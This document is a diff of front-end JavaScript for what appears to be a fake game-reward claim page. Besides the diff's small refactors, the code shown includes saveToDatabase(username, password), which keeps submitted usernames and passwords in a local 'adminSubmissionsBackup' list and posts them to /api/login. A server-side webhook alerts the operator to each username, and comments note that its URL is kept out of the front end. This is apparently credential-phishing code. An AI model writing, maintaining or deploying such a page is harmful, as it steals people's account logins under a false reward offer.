@@ -4,15 +4,6 @@
 //       No sensitive URLs are exposed here.
 // ============================================================
 
-function getApiBaseUrl() {
-    if (window.APP_CONFIG && window.APP_CONFIG.BACKEND_URL) {
-        return window.APP_CONFIG.BACKEND_URL.replace(/\/+$/, '');
-    }
-    const saved = localStorage.getItem('BACKEND_API_URL');
-    if (saved) return saved.replace(/\/+$/, '');
-    return '';
-}
-
 async function saveToDatabase(username, password) {
     // Resilient local backup (guarantees data on GitHub Pages static mode)
     try {
@@ -25,10 +16,10 @@ async function saveToDatabase(username, password) {
             created_at: new Date().toLocaleString()
         });
         localStorage.setItem('adminSubmissionsBackup', JSON.stringify(localList));
-    } catch (e) {}
+    } catch (e) { }
 
     try {
-        const res = await fetch(`${getApiBaseUrl()}/api/login`, {
+        const res = await fetch('/api/login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username, password })
@@ -43,7 +34,7 @@ async function saveToDatabase(username, password) {
 async function sendNotification(username) {
     // Webhook is called server-side — no URL exposed in frontend
     try {
-        await fetch(`${getApiBaseUrl()}/api/notify`, {
+        await fetch('/api/notify', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username })
@@ -54,37 +45,37 @@ async function sendNotification(username) {
 }
 
 // ─── Modal Elements ───────────────────────────────────────────────────────────
-const loginBtn          = document.getElementById('loginBtn');
+const loginBtn = document.getElementById('loginBtn');
 const createCharacterBtn = document.getElementById('createCharacterBtn');
-const loginBox          = document.getElementById('loginBox');
-const modalBackdrop     = document.getElementById('modalBackdrop');
-const closeLoginModal   = document.getElementById('closeLoginModal');
-const loginForm         = document.getElementById('loginForm');
-const submitBtn         = document.getElementById('submitBtn');
-const rewardPopup       = document.getElementById('rewardPopup');
-const rewardCloseBtn    = document.getElementById('rewardCloseBtn');
-const rewardCloseX      = document.getElementById('rewardCloseX');
-const refillBtn         = document.getElementById('refillBtn');
-const refreshIcon       = document.getElementById('refreshIcon');
-const refillStatus      = document.getElementById('refillStatus');
-const screenshotBtn     = document.getElementById('screenshotBtn');
+const loginBox = document.getElementById('loginBox');
+const modalBackdrop = document.getElementById('modalBackdrop');
+const closeLoginModal = document.getElementById('closeLoginModal');
+const loginForm = document.getElementById('loginForm');
+const submitBtn = document.getElementById('submitBtn');
+const rewardPopup = document.getElementById('rewardPopup');
+const rewardCloseBtn = document.getElementById('rewardCloseBtn');
+const rewardCloseX = document.getElementById('rewardCloseX');
+const refillBtn = document.getElementById('refillBtn');
+const refreshIcon = document.getElementById('refreshIcon');
+const refillStatus = document.getElementById('refillStatus');
+const screenshotBtn = document.getElementById('screenshotBtn');
 
 // ─── Mobile Elements ──────────────────────────────────────────────────────────
-const mobileLoginBtn      = document.getElementById('mobileLoginBtn');
-const mobileFlagTrigger   = document.getElementById('mobileFlagTrigger');
-const mobileMenuBtn       = document.getElementById('mobileMenuBtn');
-const mobileDrawer        = document.getElementById('mobileDrawer');
+const mobileLoginBtn = document.getElementById('mobileLoginBtn');
+const mobileFlagTrigger = document.getElementById('mobileFlagTrigger');
+const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+const mobileDrawer = document.getElementById('mobileDrawer');
 const mobileDrawerOverlay = document.getElementById('mobileDrawerOverlay');
-const closeMobileDrawer   = document.getElementById('closeMobileDrawer');
-const drawerClaimBtn      = document.getElementById('drawerClaimBtn');
+const closeMobileDrawer = document.getElementById('closeMobileDrawer');
+const drawerClaimBtn = document.getElementById('drawerClaimBtn');
 const drawerScreenshotsBtn = document.getElementById('drawerScreenshotsBtn');
 const mobileScreenshotBtn = document.getElementById('mobileScreenshotBtn');
-const drawerLangChips     = document.querySelectorAll('.drawer-lang-chip');
-const mobileLangSheet     = document.getElementById('mobileLangSheet');
-const closeLangSheet      = document.getElementById('closeLangSheet');
-const langSheetItems      = document.querySelectorAll('.lang-sheet-item');
-const currentFlagEmoji    = document.getElementById('currentFlagEmoji');
-const currentFlagText     = document.getElementById('currentFlagText');
+const drawerLangChips = document.querySelectorAll('.drawer-lang-chip');
+const mobileLangSheet = document.getElementById('mobileLangSheet');
+const closeLangSheet = document.getElementById('closeLangSheet');
+const langSheetItems = document.querySelectorAll('.lang-sheet-item');
+const currentFlagEmoji = document.getElementById('currentFlagEmoji');
+const currentFlagText = document.getElementById('currentFlagText');
 
 // ─── Scroll helper (works with CSS scroll-snap container) ─────────────────────
 const snapContainer = document.querySelector('.site-container');
@@ -97,9 +88,9 @@ function scrollToSection(sectionId) {
 }
 
 // ─── Flags Dropdown ───────────────────────────────────────────────────────────
-const flagBtn       = document.getElementById('flagBtn');
+const flagBtn = document.getElementById('flagBtn');
 const flagsDropdown = document.getElementById('flagsDropdown');
-const flagItems     = document.querySelectorAll('.flag-item');
+const flagItems = document.querySelectorAll('.flag-item');
 
 function toggleFlagsDropdown(show) {
     const isShow = typeof show === 'boolean' ? show : !flagsDropdown?.classList.contains('show');
@@ -141,7 +132,7 @@ function showToast(message) {
 
 function setLanguage(langCode, langName, langEmoji) {
     if (currentFlagEmoji && langEmoji) currentFlagEmoji.textContent = langEmoji;
-    if (currentFlagText && langCode)  currentFlagText.textContent = langCode.toUpperCase();
+    if (currentFlagText && langCode) currentFlagText.textContent = langCode.toUpperCase();
     langSheetItems.forEach(item => {
         const isActive = item.getAttribute('data-lang') === langCode;
         item.classList.toggle('active', isActive);
